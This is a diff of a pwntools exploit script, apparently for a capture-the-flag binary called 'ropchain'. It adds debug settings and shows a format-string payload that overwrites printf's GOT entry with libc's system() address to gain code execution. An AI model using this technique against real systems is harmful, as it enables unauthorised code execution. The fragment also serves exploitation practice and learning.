@@ -1,5 +1,8 @@
 from pwn import *
 
+context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
 # Load ELF và libc
 elf = ELF("./ropchain")
 libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
@@ -60,11 +63,12 @@ info(f"Libc base: 0x{libc.address:02x}")
 # Get system address
 system = libc.sym['system']
 
+
+# Define payload2
 val_system_0 = system & 0xffff
 val_system_2 = (system >> (2 * 8)) & 0xffff
 val_system_4 = (system >> (4 * 8)) & 0xffff
 
-# Define payload2
 fmt = {
     elf.got['printf'] + 0: val_system_0,
     elf.got['printf'] + 2: val_system_2,
